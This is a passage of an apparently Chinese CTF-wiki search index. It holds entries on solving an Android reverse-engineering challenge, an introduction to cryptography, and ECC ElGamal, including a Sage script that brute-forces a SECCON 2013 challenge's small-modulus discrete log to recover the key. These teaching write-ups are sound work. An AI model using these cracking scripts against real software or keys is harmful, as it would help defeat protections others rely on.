\"()V\" \u5e76\u5728\u4e4b\u540e\u83b7\u5f97\u4e86key\u7684\u5185\u5bb9\u3002 public static String key ; public static void calcKey () { key = new StringBuffer ( \"c7^WVHZ,\" ). reverse (). toString (); } }","title":"\u5206\u6790abcdefghijklmn"},{"location":"android/basic_reverse/static/so-example/#flag","text":"\u6839\u636e\u8fd9\u4e09\u4e2a\u5224\u65ad\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u5185\u5bb9 s = \"QflMn`fH,ZHVW^7c\" flag = \"\" for idx , c in enumerate ( s ): flag += chr ( ord ( c ) + idx ) print flag \u7ed3\u679c\u5982\u4e0b QgnPrelO4cRackEr \u8f93\u5165\u4e4b\u540e\u5e76\u4e0d\u5bf9\u3002","title":"\u83b7\u53d6flag"},{"location":"android/basic_reverse/static/so-example/#_6","text":"\u60f3\u5230\u8fd9\u91cc\u5c31\u8981\u8003\u8651\u4e0b\uff0c\u7a0b\u5e8f\u662f\u4e0d\u662f\u5728\u54ea\u91cc\u4fee\u6539\u4e86\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u3002\u8fd9\u91cc\u9996\u5148\u770b\u4e00\u4e0bseed\u3002\u5bf9 x \u8fdb\u884c\u4ea4\u53c9\u5f15\u7528\uff0c\u53d1\u73b0\u5176\u5728 _init_my \u4e2d\u4f7f\u7528\u4e86\uff0c\u5982\u4e0b size_t _init_my () { size_t i ; // r7 char * v1 ; // r4 size_t result ; // r0 for ( i = 0 ; ; ++ i ) { v1 = seed [ 0 ]; result = strlen ( seed [ 0 ]); if ( i >= result ) break ; t [ i ] = v1 [ i ] - 3 ; } seed [ 0 ] = t ; byte_4038 = 0 ; return result ; } \u6240\u4ee5\u6700\u521d\u7a0b\u5e8f\u5bf9 seed \u8fdb\u884c\u4e86\u4fee\u6539\u3002","title":"\u518d\u6b21\u5206\u6790"},{"location":"android/basic_reverse/static/so-example/#flag_1","text":"\u4fee\u6539\u811a\u672c\u5982\u4e0b s = \"QflMn`fH,ZHVW^7c\" flag = \"\" for idx , c in enumerate ( s ): tmp = ord ( c ) if idx < 8 : tmp -= 3 flag += chr ( tmp + idx ) print flag flag \u5982\u4e0b \u279c 2015-\u6d77\u5ce1\u4e24\u5cb8\u4e00\u4e2aAPK\uff0c\u9006\u5411\u8bd5\u8bd5\u5427 python exp.py NdkMobiL4cRackEr \u5f53\u7136\u8be5\u9898\u76ee\u4e5f\u53ef\u4ee5\u4f7f\u7528\u52a8\u6001\u8c03\u8bd5\u3002","title":"\u518d\u6b21\u83b7\u53d6flag"},{"location":"crypto/introduction/","text":"\u5bc6\u7801\u5b66\uff08Cryptography\uff09\u4e00\u822c\u53ef\u5206\u4e3a\u53e4\u5178\u5bc6\u7801\u5b66\u548c\u73b0\u4ee3\u5bc6\u7801\u5b66\u3002 \u5176\u4e2d\uff0c\u53e4\u5178\u5bc6\u7801\u5b66\uff0c\u4f5c\u4e3a\u4e00\u79cd\u5b9e\u7528\u6027\u827a\u672f\u5b58\u5728\uff0c\u5176\u7f16\u7801\u548c\u7834\u8bd1\u901a\u5e38\u4f9d\u8d56\u4e8e\u8bbe\u8ba1\u8005\u548c\u654c\u624b\u7684\u521b\u9020\u529b\u4e0e\u6280\u5de7\uff0c\u5e76\u6ca1\u6709\u5bf9\u5bc6\u7801\u5b66\u539f\u4ef6\u8fdb\u884c\u6e05\u6670\u7684\u5b9a\u4e49\u3002\u53e4\u5178\u5bc6\u7801\u5b66\u4e3b\u8981\u5305\u542b\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\uff1a \u5355\u8868\u66ff\u6362\u52a0\u5bc6\uff08Monoalphabetic Cipher\uff09 \u591a\u8868\u66ff\u6362\u52a0\u5bc6\uff08Polyalphabetic Cipher\uff09 \u5947\u5947\u602a\u602a\u7684\u52a0\u5bc6\u65b9\u5f0f \u800c\u73b0\u4ee3\u5bc6\u7801\u5b66\u5219\u8d77\u6e90\u4e8e 20 \u4e16\u7eaa\u4e2d\u540e\u671f\u51fa\u73b0\u7684\u5927\u91cf\u76f8\u5173\u7406\u8bba\uff0c1949 \u5e74\u9999\u519c\uff08C. E. Shannon\uff09\u53d1\u8868\u4e86\u9898\u4e3a\u300a\u4fdd\u5bc6\u7cfb\u7edf\u7684\u901a\u4fe1\u7406\u8bba\u300b\u7684\u7ecf\u5178\u8bba\u6587\u6807\u5fd7\u7740\u73b0\u4ee3\u5bc6\u7801\u5b66\u7684\u5f00\u59cb\u3002\u73b0\u4ee3\u5bc6\u7801\u5b66\u4e3b\u8981\u5305\u542b\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\uff1a \u5bf9\u79f0\u52a0\u5bc6\uff08Symmetric Cryptography\uff09\uff0c\u4ee5 DES\uff0cAES\uff0cRC4 \u4e3a\u4ee3\u8868\u3002 \u975e\u5bf9\u79f0\u52a0\u5bc6\uff08Asymmetric Cryptography\uff09\uff0c\u4ee5 RSA\uff0cElGamal\uff0c\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u4e3a\u4ee3\u8868\u3002 \u54c8\u5e0c\u51fd\u6570\uff08Hash Function\uff09\uff0c\u4ee5 MD5\uff0cSHA-1\uff0cSHA-512 \u7b49\u4e3a\u4ee3\u8868\u3002 \u6570\u5b57\u7b7e\u540d\uff08Digital Signature\uff09\uff0c\u4ee5 RSA \u7b7e\u540d\uff0cElGamal \u7b7e\u540d\uff0cDSA \u7b7e\u540d\u4e3a\u4ee3\u8868\u3002 \u5176\u4e2d\uff0c\u5bf9\u79f0\u52a0\u5bc6\u4f53\u5236\u4e3b\u8981\u5206\u4e3a\u4e24\u79cd\u65b9\u5f0f\uff1a \u5206\u7ec4\u5bc6\u7801\uff08Block Cipher\uff09\uff0c\u53c8\u79f0\u4e3a\u5757\u5bc6\u7801\u3002 \u5e8f\u5217\u5bc6\u7801\uff08Stream Cipher\uff09\uff0c\u53c8\u79f0\u4e3a\u6d41\u5bc6\u7801\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u5bc6\u7801\u8bbe\u8ba1\u8005\u7684\u6839\u672c\u76ee\u6807\u662f\u4fdd\u969c\u4fe1\u606f\u53ca\u4fe1\u606f\u7cfb\u7edf\u7684 \u673a\u5bc6\u6027\uff08Confidentiality\uff09 \u5b8c\u6574\u6027\uff08Integrity\uff09 \u53ef\u7528\u6027\uff08Availability\uff09 \u8ba4\u8bc1\u6027\uff08Authentication\uff09 \u4e0d\u53ef\u5426\u8ba4\u6027\uff08Non-repudiation\uff09 \u5176\u4e2d\uff0c\u524d\u4e09\u8005\u88ab\u79f0\u4e3a\u4fe1\u606f\u5b89\u5168\u7684 CIA \u4e09\u8981\u7d20 \u3002 \u800c\u5bf9\u4e8e\u5bc6\u7801\u7834\u89e3\u8005\u6765\u8bf4\uff0c\u4e00\u822c\u662f\u8981\u60f3\u529e\u6cd5\u8bc6\u522b\u51fa\u5bc6\u7801\u7b97\u6cd5\uff0c\u7136\u540e\u8fdb\u884c\u66b4\u529b\u7834\u89e3\uff0c\u6216\u8005\u5229\u7528\u5bc6\u7801\u4f53\u5236\u7684\u6f0f\u6d1e\u8fdb\u884c\u7834\u89e3\u3002\u5f53\u7136\uff0c\u4e5f\u6709\u53ef\u80fd\u901a\u8fc7\u6784\u9020\u865a\u5047\u7684\u54c8\u5e0c\u503c\u6216\u8005\u6570\u5b57\u7b7e\u540d\u6765\u7ed5\u8fc7\u76f8\u5e94\u7684\u68c0\u6d4b\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u90fd\u4f1a\u5047\u8bbe\u653b\u51fb\u8005\u5df2\u77e5\u5f85\u7834\u89e3\u7684\u5bc6\u7801\u4f53\u5236\uff0c\u800c\u653b\u51fb\u7c7b\u578b\u901a\u5e38\u5206\u4e3a\u4ee5\u4e0b\u56db\u79cd\uff1a \u653b\u51fb\u7c7b\u578b \u8bf4\u660e \u552f\u5bc6\u6587\u653b\u51fb \u53ea\u62e5\u6709\u5bc6\u6587 \u5df2\u77e5\u660e\u6587\u653b\u51fb \u62e5\u6709\u5bc6\u6587\u4e0e\u5bf9\u5e94\u7684\u660e\u6587 \u9009\u62e9\u660e\u6587\u653b\u51fb \u62e5\u6709\u52a0\u5bc6\u6743\u9650\uff0c\u80fd\u591f\u5bf9\u660e\u6587\u52a0\u5bc6\u540e\u83b7\u5f97\u76f8\u5e94\u5bc6\u6587 \u9009\u62e9\u5bc6\u6587\u653b\u51fb \u62e5\u6709\u89e3\u5bc6\u6743\u9650\uff0c\u80fd\u591f\u5bf9\u5bc6\u6587\u89e3\u5bc6\u540e\u83b7\u5f97\u76f8\u5e94\u660e\u6587 Note \u6ce8\uff1a\u4e4b\u524d\u5728\u8fd9\u91cc\u66fe\u5199\u8fc7\u8fd9\u4e9b\u653b\u51fb\u5e38\u89c1\u7684\u573a\u666f\uff0c\u968f\u7740\u4e0d\u65ad\u5730\u5b66\u4e60\uff0c\u6e10\u6e10\u610f\u8bc6\u5230\u8fd9\u4e9b\u653b\u51fb\u7c7b\u578b\u4fa7\u91cd\u63cf\u8ff0\u653b\u51fb\u8005\u7684\u80fd\u529b\uff0c\u6709\u53ef\u80fd\u9002\u7528\u4e8e\u5404\u79cd\u5404\u6837\u7684\u573a\u666f\u3002\u6545\u8fdb\u884c\u4fee\u6b63\u3002 \u8fd9\u91cc\u63a8\u8350\u4e00\u4e9b\u8d44\u6599 \u53ef\u6c57\u5b66\u9662\u516c\u5f00\u8bfe \u6df1\u5165\u6d45\u51fa\u5bc6\u7801\u5b66\u2014\u2014\u5e38\u7528\u52a0\u5bc6\u6280\u672f\u539f\u7406\u4e0e\u5e94\u7528 https://cryptopals.com/ \uff0c\u4e00\u5806\u5bc6\u7801\u5b66\u7684\u7ec3\u4e60\u9898\u76ee\u3002 Note \u63a8\u8350\u5728\u770b\u5b8c\u516c\u5f00\u8bfe\u7684\u60c5\u51b5\u4e0b\uff0c\u4ee5\u53ca\u7b80\u5355\u770b\u770b\u7535\u5b50\u4e66\u7684\u60c5\u51b5\u4e0b\u5728\u8003\u8651\u662f\u5426\u8981\u8d2d\u4e70\u4e66\uff0c\u56e0\u4e3a\u4e66\u4e70\u56de\u6765\u4e00\u822c\u90fd\u88ab\u95f2\u7f6e\u8d77\u6765\u4e86\u3002 \u53c2\u8003 \u00b6 \u7ef4\u57fa\u767e\u79d1-\u5bc6\u7801\u5b66 Info \u672c\u8282\u5927\u90e8\u5206\u5b9a\u4e49\u4e0e\u4f8b\u5b50\u53c2\u8003\u4e86\u7ef4\u57fa\u767e\u79d1\u3002","title":"\u5bc6\u7801\u5b66\u7b80\u4ecb"},{"location":"crypto/introduction/#_1","text":"\u7ef4\u57fa\u767e\u79d1-\u5bc6\u7801\u5b66 Info \u672c\u8282\u5927\u90e8\u5206\u5b9a\u4e49\u4e0e\u4f8b\u5b50\u53c2\u8003\u4e86\u7ef4\u57fa\u767e\u79d1\u3002","title":"\u53c2\u8003"},{"location":"crypto/asymmetric/introduction/","text":"\u5728\u975e\u5bf9\u79f0\u5bc6\u7801\u4e2d\uff0c\u52a0\u5bc6\u8005\u4e0e\u89e3\u5bc6\u8005\u6240\u4f7f\u7528\u7684\u5bc6\u94a5\u5e76\u4e0d\u4e00\u6837\uff0c\u5178\u578b\u7684\u6709 RSA \u52a0\u5bc6\uff0c\u80cc\u5305\u52a0\u5bc6\uff0c\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u3002","title":"\u975e\u5bf9\u79f0\u52a0\u5bc6\u7b80\u4ecb"},{"location":"crypto/asymmetric/discrete-log/ecc/","text":"ECC \u00b6 \u6982\u8ff0 \u00b6 ECC \u5168\u79f0\u4e3a\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\uff0cEllipseCurve Cryptography\uff0c\u662f\u4e00\u79cd\u57fa\u4e8e\u692d\u5706\u66f2\u7ebf\u6570\u5b66\u7684\u516c\u94a5\u5bc6\u7801\u3002\u4e0e\u4f20\u7edf\u7684\u57fa\u4e8e\u5927\u8d28\u6570\u56e0\u5b50\u5206\u89e3\u56f0\u96be\u6027\u7684\u52a0\u5bc6\u65b9\u6cd5\u4e0d\u540c\uff0cECC\u4f9d\u8d56\u4e8e\u89e3\u51b3\u692d\u5706\u66f2\u7ebf\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u7684\u56f0\u96be\u6027\u3002\u5b83\u7684\u4f18\u52bf\u4e3b\u8981\u5728\u4e8e\u76f8\u5bf9\u4e8e\u5176\u5b83\u65b9\u6cd5\uff0c\u5b83\u53ef\u4ee5\u5728\u4f7f\u7528\u8f83\u77ed\u5bc6\u94a5\u957f\u5ea6\u7684\u540c\u65f6\u4fdd\u6301\u76f8\u540c\u7684\u5bc6\u7801\u5f3a\u5ea6\u3002\u76ee\u524d\u692d\u5706\u66f2\u7ebf\u4e3b\u8981\u91c7\u7528\u7684\u6709\u9650\u57df\u6709 \u4ee5\u7d20\u6570\u4e3a\u6a21\u7684\u6574\u6570\u57dfGF(p)\uff0c\u901a\u5e38\u5728\u901a\u7528\u5904\u7406\u5668\u4e0a\u66f4\u4e3a\u6709\u6548\u3002 \u7279\u5f81\u4e3a 2 \u7684\u4f3d\u7f57\u534e\u57dfGF\uff082^m\uff09\uff0c\u53ef\u4ee5\u8bbe\u8ba1\u4e13\u95e8\u7684\u786c\u4ef6\u3002 \u57fa\u672c\u77e5\u8bc6 \u00b6 \u6211\u4eec\u9996\u5148\u6765\u4e86\u89e3\u4e00\u4e0b\u6709\u9650\u57df\u4e0a\u7684\u692d\u5706\u66f2\u7ebf\uff0c\u6709\u9650\u57df\u4e0a\u7684\u692d\u5706\u66f2\u7ebf\u662f\u6307\u5728\u692d\u5706\u66f2\u7ebf\u7684\u5b9a\u4e49\u5f0f y^2+axy+by=x^3+cx^2+dx+e y^2+axy+by=x^3+cx^2+dx+e \u4e2d\u6240\u6709\u7684\u7cfb\u6570\u90fd\u662f\u5728\u67d0\u4e2a\u6709\u9650\u57dfGF(p)\u4e2d\u7684\u5143\u7d20\uff0c\u5176\u4e2dp\u4e3a\u4e00\u4e2a\u5927\u7d20\u6570\u3002 \u5f53\u7136\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684\u692d\u5706\u66f2\u7ebf\u90fd\u9002\u5408\u4e8e\u52a0\u5bc6\uff0c\u6700\u4e3a\u5e38\u7528\u7684\u65b9\u7a0b\u5982\u4e0b y^2=x^3+ax+b y^2=x^3+ax+b \u5176\u4e2d 4a^3+27b^2 \\bmod p \\neq 0 4a^3+27b^2 \\bmod p \\neq 0 \u6211\u4eec\u79f0\u8be5\u65b9\u7a0b\u7684\u6240\u6709\u89e3(x,y)\uff0c( x\\in Fp , y \\in Fp x\\in Fp , y \\in Fp )\uff0c\u4ee5\u53ca\u4e00\u4e2a\u79f0\u4e3a\u201c\u65e0\u7a77\u8fdc\u70b9\u201d(O)\u7ec4\u6210\u7684\u96c6\u5408\u4e3a\u5b9a\u4e49\u5728Fp\u4e0a\u7684\u4e00\u4e2a\u692d\u5706\u66f2\u7ebf\uff0c\u8bb0\u4e3aE(Fp)\u3002 \u4e00\u822c\u5b9a\u4e49\u692d\u5706\u66f2\u7ebf\u5bc6\u7801\u9700\u8981\u4ee5\u4e0b\u6761\u4ef6 \u5047\u8bbeE(Fp)\u5bf9\u4e8e\u70b9\u7684\u8fd0\u7b97 \\oplus \\oplus \u5f62\u6210\u4e00\u4e2aable\u7fa4\uff08\u4ea4\u6362\u7fa4\uff0c\u9006\u5143\u5b58\u5728\uff0c\u5c01\u95ed\u6027\u7b49\uff09\uff0c\u8bbe p\\in E(Fq) p\\in E(Fq) \uff0c\u4e14\u6ee1\u8db3\u4e0b\u5217\u6761\u4ef6\u7684t\u5f88\u5927 p \\oplus p \\oplus ... \\oplus p=O p \\oplus p \\oplus ... \\oplus p=O \u5176\u4e2d\u5171\u6709t\u4e2ap\u53c2\u4e0e\u8fd0\u7b97\u3002\u8fd9\u91cc\u6211\u4eec\u79f0t\u4e3ap\u7684\u5468\u671f\u3002\u6b64\u5916\uff0c\u5bf9\u4e8e Q\\in E(Fq) Q\\in E(Fq) \uff0c\u5b9a\u6709\u67d0\u4e2a\u6b63\u6574\u6570m\u4f7f\u5f97\u4e0b\u5217\u5f0f\u5b50\u6210\u7acb\uff0c\u5b9a\u4e49 m=log_pq m=log_pq Q=m\\cdot p =p \\oplus p \\oplus ... \\oplus p Q=m\\cdot p =p \\oplus p \\oplus ... \\oplus p \uff08m\u4e2ap\u53c2\u4e0e\u8fd0\u7b97\uff09 \u6b64\u5916\uff0c\u5047\u8bbeG\u662f\u8be5 E_q (a,b) E_q (a,b) \u7684\u751f\u6210\u5143\uff0c\u5373\u53ef\u4ee5\u751f\u6210\u5176\u4e2d\u7684\u6240\u6709\u5143\u7d20\uff0c\u5176\u9636\u4e3a\u6ee1\u8db3 nG=O nG=O \u7684\u6700\u5c0f\u6b63\u6574\u6570n\u3002 ECC\u4e2d\u7684ElGamal \u00b6 \u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u7528\u6237B\u8981\u628a\u6d88\u606f\u52a0\u5bc6\u540e\u4f20\u7ed9\u7528\u6237A\u3002 \u5bc6\u94a5\u751f\u6210 \u00b6 \u7528\u6237A\u5148\u9009\u62e9\u4e00\u6761\u692d\u5706\u66f2\u7ebf E_q (a,b) E_q (a,b) \uff0c\u7136\u540e\u9009\u62e9\u5176\u4e0a\u7684\u4e00\u4e2a\u751f\u6210\u5143G\uff0c\u5047\u8bbe\u5176\u9636\u4e3an\uff0c\u4e4b\u540e\u518d\u9009\u62e9\u4e00\u4e2a\u6b63\u6574\u6570 n_a n_a \u4f5c\u4e3a\u5bc6\u94a5\uff0c\u8ba1\u7b97 P_a=n_aG P_a=n_aG \u3002 \u5176\u4e2d\uff0c E_q(a,b), q,G E_q(a,b), q,G \u90fd\u4f1a\u88ab\u516c\u5f00\u3002 \u516c\u94a5\u4e3a P_a P_a \uff0c\u79c1\u94a5\u4e3a$n_a $\u3002 \u52a0\u5bc6 \u00b6 \u7528\u6237B\u5728\u5411\u7528\u6237A\u53d1\u9001\u6d88\u606fm\uff0c\u8fd9\u91cc\u5047\u8bbe\u6d88\u606fm\u5df2\u7ecf\u88ab\u7f16\u7801\u4e3a\u692d\u5706\u66f2\u7ebf\u4e0a\u7684\u70b9\uff0c\u5176\u52a0\u5bc6\u6b65\u9aa4\u5982\u4e0b \u67e5\u8be2\u7528\u6237A\u7684\u516c\u94a5 E_q(a,b), q, P_a,G E_q(a,b), q, P_a,G \u3002 \u5728(1,q-1) \u7684\u533a\u95f4\u5185\u9009\u62e9\u968f\u673a\u6570k \u3002 \u6839\u636eA\u7684\u516c\u94a5\u8ba1\u7b97\u70b9 (x_1,y_1)=kG (x_1,y_1)=kG \u3002 \u8ba1\u7b97\u70b9 (x_2,y_2)=kP_a (x_2,y_2)=kP_a \uff0c\u5982\u679c\u4e3aO\uff0c\u5219\u4ece\u7b2c\u4e8c\u6b65\u91cd\u65b0\u5f00\u59cb\u3002 \u8ba1\u7b97 C=m+(x_2,y_2) C=m+(x_2,y_2) \u5c06 ((x_1,y_1),C) ((x_1,y_1),C) \u53d1\u9001\u7ed9A\u3002 \u89e3\u5bc6 \u00b6 \u89e3\u5bc6\u6b65\u9aa4\u5982\u4e0b \u5229\u7528\u79c1\u94a5\u8ba1\u7b97\u70b9 n_a(x_1,y_1)=n_akG=kP_a=(x_2,y_2) n_a(x_1,y_1)=n_akG=kP_a=(x_2,y_2) \u3002 \u8ba1\u7b97\u6d88\u606f m=C-(x_2,y_2) m=C-(x_2,y_2) \u3002 \u5173\u952e\u70b9 \u00b6 \u8fd9\u91cc\u7684\u5173\u952e\u70b9\u5728\u4e8e\u6211\u4eec\u5373\u4f7f\u77e5\u9053\u4e86 (x_1,y_1) (x_1,y_1) \u4e5f\u96be\u4ee5\u77e5\u9053k\uff0c\u8fd9\u662f\u7531\u79bb\u6563\u5bf9\u6570\u7684\u95ee\u9898\u7684\u96be\u5ea6\u51b3\u5b9a\u7684\u3002 2013 SECCON CTF quals Cryptanalysis \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee52013\u5e74SECCON CTF quals \u4e2d\u7684 Cryptanalysis \u4e3a\u4f8b\uff0c\u9898\u76ee\u5982\u4e0b \u8fd9\u91cc\uff0c\u6211\u4eec\u5df2\u77e5\u692d\u5706\u66f2\u7ebf\u65b9\u7a0b\u4ee5\u53ca\u5bf9\u5e94\u7684\u751f\u6210\u5143 base\uff0c\u8fd8\u77e5\u9053\u76f8\u5e94\u7684\u6a21\u6570\u4ee5\u53ca\u516c\u94a5\u4ee5\u53ca\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u3002 \u4f46\u662f\u53ef\u4ee5\u770b\u51fa\u7684\u6211\u4eec\u7684\u6a21\u6570\u592a\u5c0f\uff0c\u6211\u4eec\u66b4\u529b\u679a\u4e3e\u83b7\u53d6\u7ed3\u679c\u3002 \u8fd9\u91cc\u76f4\u63a5\u53c2\u8003 github\u4e0a\u7684 sage \u7a0b\u5e8f\uff0c\u66b4\u529b\u8dd1\u51fa secret key\u3002\u4e4b\u540e\u4fbf\u53ef\u4ee5\u89e3\u5bc6\u4e86\u3002 a = 1234577 b = 3213242 n = 7654319 E = EllipticCurve ( GF ( n ), [ 0 , 0 , 0 , a , b ]) base = E ([ 5234568 , 2287747 ]) pub = E ([ 2366653 , 1424308 ]) c1 = E ([ 5081741 , 6744615 ]) c2 = E ([ 610619 , 6218 ]) X = base for i in range ( 1 , n ): if X == pub : secret = i print \"[+] secret:\" , i break else : X = X + base print i m = c2 - ( c1 * secret ) print \"[+] x:\" , m [ 0 ] print \"[+] y:\" , m [ 1 ] print \"[+] x+y:\" , m [ 0 ] + m [ 1 ] \u66b4\u529b\u8dd1\u51fa\u7ed3\u679c [ + ] secret: 1584718 [ + ] x: 2171002 [ + ] y: 3549912 [ + ] x+y: 5720914 \u53c2\u8003 \u00b6 https://github.com/sonickun/ctf-crypto-writeups/tree/master/2013/seccon-ctf-quals/cryptanalysis","title":"ECC"},{"location":"crypto/asymmetric/discrete-log/ecc/#ecc","text":"","title":"ECC"},{"location":"crypto/asymmetric/discrete-log/ecc/#_1","text":"ECC \u5168\u79f0\u4e3a\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\uff0cEllipseCurve Cryptography\uff0c\u662f\u4e00\u79cd\u57fa\u4e8e\u692d\u5706\u66f2\u7ebf\u6570\u5b66\u7684\u516c\u94a5\u5bc6\u7801\u3002\u4e0e\u4f20\u7edf\u7684\u57fa\u4e8e\u5927\u8d28\u6570\u56e0\u5b50\u5206\u89e3\u56f0\u96be\u6027\u7684\u52a0\u5bc6\u65b9\u6cd5\u4e0d\u540c\uff0cECC\u4f9d\u8d56\u4e8e\u89e3\u51b3\u692d\u5706\u66f2\u7ebf\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u7684\u56f0\u96be\u6027\u3002\u5b83\u7684\u4f18\u52bf\u4e3b\u8981\u5728\u4e8e\u76f8\u5bf9\u4e8e\u5176\u5b83\u65b9\u6cd5\uff0c\u5b83\u53ef\u4ee5\u5728\u4f7f\u7528\u8f83\u77ed\u5bc6\u94a5\u957f\u5ea6\u7684\u540c\u65f6\u4fdd\u6301\u76f8\u540c\u7684\u5bc6\u7801\u5f3a\u5ea6\u3002\u76ee\u524d\u692d\u5706\u66f2\u7ebf\u4e3b\u8981\u91c7\u7528\u7684\u6709\u9650\u57df\u6709 \u4ee5\u7d20\u6570\u4e3a\u6a21\u7684\u6574\u6570\u57dfGF(p)\uff0c\u901a\u5e38\u5728\u901a\u7528\u5904\u7406\u5668\u4e0a\u66f4\u4e3a\u6709\u6548\u3002 \u7279\u5f81\u4e3a 2 \u7684\u4f3d\u7f57\u534e\u57dfGF\uff082^m\uff09\uff0c\u53ef\u4ee5\u8bbe\u8ba1\u4e13\u95e8\u7684\u786c\u4ef6\u3002","title":"\u6982\u8ff0"},{"location":"crypto/asymmetric/discrete-log/ecc/#_2","text":"\u6211\u4eec\u9996\u5148\u6765\u4e86\u89e3\u4e00\u4e0b\u6709\u9650\u57df\u4e0a\u7684\u692d\u5706\u66f2\u7ebf\uff0c\u6709\u9650\u57df\u4e0a\u7684\u692d\u5706\u66f2\u7ebf\u662f\u6307\u5728\u692d\u5706\u66f2\u7ebf\u7684\u5b9a\u4e49\u5f0f y^2+axy+by=x^3+cx^2+dx+e y^2+axy+by=x^3+cx^2+dx+e \u4e2d\u6240\u6709\u7684\u7cfb\u6570\u90fd\u662f\u5728\u67d0\u4e2a\u6709\u9650\u57dfGF(p)\u4e2d\u7684\u5143\u7d20\uff0c\u5176\u4e2dp\u4e3a\u4e00\u4e2a\u5927\u7d20\u6570\u3002 \u5f53\u7136\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684\u692d\u5706\u66f2\u7ebf\u90fd\u9002\u5408\u4e8e\u52a0\u5bc6\uff0c\u6700\u4e3a\u5e38\u7528\u7684\u65b9\u7a0b\u5982\u4e0b y^2=x^3+ax+b y^2=x^3+ax+b \u5176\u4e2d 4a^3+27b^2 \\bmod p \\neq 0 4a^3+27b^2 \\bmod p \\neq 0 \u6211\u4eec\u79f0\u8be5\u65b9\u7a0b\u7684\u6240\u6709\u89e3(x,y)\uff0c( x\\in Fp , y \\in Fp x\\in Fp , y \\in Fp )\uff0c\u4ee5\u53ca\u4e00\u4e2a\u79f0\u4e3a\u201c\u65e0\u7a77\u8fdc\u70b9\u201d(O)\u7ec4\u6210\u7684\u96c6\u5408\u4e3a\u5b9a\u4e49\u5728Fp\u4e0a\u7684\u4e00\u4e2a\u692d\u5706\u66f2\u7ebf\uff0c\u8bb0\u4e3aE(Fp)\u3002 \u4e00\u822c\u5b9a\u4e49\u692d\u5706\u66f2\u7ebf\u5bc6\u7801\u9700\u8981\u4ee5\u4e0b\u6761\u4ef6 \u5047\u8bbeE(Fp)\u5bf9\u4e8e\u70b9\u7684\u8fd0\u7b97 \\oplus \\oplus \u5f62\u6210\u4e00\u4e2aable\u7fa4\uff08\u4ea4\u6362\u7fa4\uff0c\u9006\u5143\u5b58\u5728\uff0c\u5c01\u95ed\u6027\u7b49\uff09\uff0c\u8bbe p\\in E(Fq) p\\in E(Fq) \uff0c\u4e14\u6ee1\u8db3\u4e0b\u5217\u6761\u4ef6\u7684t\u5f88\u5927 p \\oplus p \\oplus ... \\oplus p=O p \\oplus p \\oplus ... \\oplus p=O \u5176\u4e2d\u5171\u6709t\u4e2ap\u53c2\u4e0e\u8fd0\u7b97\u3002\u8fd9\u91cc\u6211\u4eec\u79f0t\u4e3ap\u7684\u5468\u671f\u3002\u6b64\u5916\uff0c\u5bf9\u4e8e Q\\in E(Fq) Q\\in E(Fq) \uff0c\u5b9a\u6709\u67d0\u4e2a\u6b63\u6574\u6570m\u4f7f\u5f97\u4e0b\u5217\u5f0f\u5b50\u6210\u7acb\uff0c\u5b9a\u4e49 m=log_pq m=log_pq Q=m\\cdot p =p \\oplus p \\oplus ... \\oplus p Q=m\\cdot p =p \\oplus p \\oplus ... \\oplus p \uff08m\u4e2ap\u53c2\u4e0e\u8fd0\u7b97\uff09 \u6b64\u5916\uff0c\u5047\u8bbeG\u662f\u8be5 E_q (a,b) E_q (a,b) \u7684\u751f\u6210\u5143\uff0c\u5373\u53ef\u4ee5\u751f\u6210\u5176\u4e2d\u7684\u6240\u6709\u5143\u7d20\uff0c\u5176\u9636\u4e3a\u6ee1\u8db3 nG=O nG=O \u7684\u6700\u5c0f\u6b63\u6574\u6570n\u3002","title":"\u57fa\u672c\u77e5\u8bc6"},{"location":"crypto/asymmetric/discrete-log/ecc/#eccelgamal","text":"\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u7528\u6237B\u8981\u628a\u6d88\u606f\u52a0\u5bc6\u540e\u4f20\u7ed9\u7528\u6237A\u3002","title":"ECC\u4e2d\u7684ElGamal"},{"location":"crypto/asymmetric/discrete-log/ecc/#_3","text":"\u7528\u6237A\u5148\u9009\u62e9\u4e00\u6761\u692d\u5706\u66f2\u7ebf E_q (a,b) E_q (a,b) \uff0c\u7136\u540e\u9009\u62e9\u5176\u4e0a\u7684\u4e00\u4e2a\u751f\u6210\u5143G\uff0c\u5047\u8bbe\u5176\u9636\u4e3an\uff0c\u4e4b\u540e\u518d\u9009\u62e9\u4e00\u4e2a\u6b63\u6574\u6570 n_a n_a \u4f5c\u4e3a\u5bc6\u94a5\uff0c\u8ba1\u7b97 P_a=n_aG P_a=n_aG \u3002 \u5176\u4e2d\uff0c E_q(a,b), q,G E_q(a,b), q,G \u90fd\u4f1a\u88ab\u516c\u5f00\u3002 \u516c\u94a5\u4e3a P_a P_a \uff0c\u79c1\u94a5\u4e3a$n_a $\u3002","title":"\u5bc6\u94a5\u751f\u6210"},{"location":"crypto/asymmetric/discrete-log/ecc/#_4","text":"\u7528\u6237B\u5728\u5411\u7528\u6237A\u53d1\u9001\u6d88\u606fm\uff0c\u8fd9\u91cc\u5047\u8bbe\u6d88\u606fm\u5df2\u7ecf\u88ab\u7f16\u7801\u4e3a\u692d\u5706\u66f2\u7ebf\u4e0a\u7684\u70b9\uff0c\u5176\u52a0\u5bc6\u6b65\u9aa4\u5982\u4e0b \u67e5\u8be2\u7528\u6237A\u7684\u516c\u94a5 E_q(a,b), q, P_a,G E_q(a,b), q, P_a,G \u3002 \u5728(1,q-1) \u7684\u533a\u95f4\u5185\u9009\u62e9\u968f\u673a\u6570k \u3002 \u6839\u636eA\u7684\u516c\u94a5\u8ba1\u7b97\u70b9 (x_1,y_1)=kG (x_1,y_1)=kG \u3002 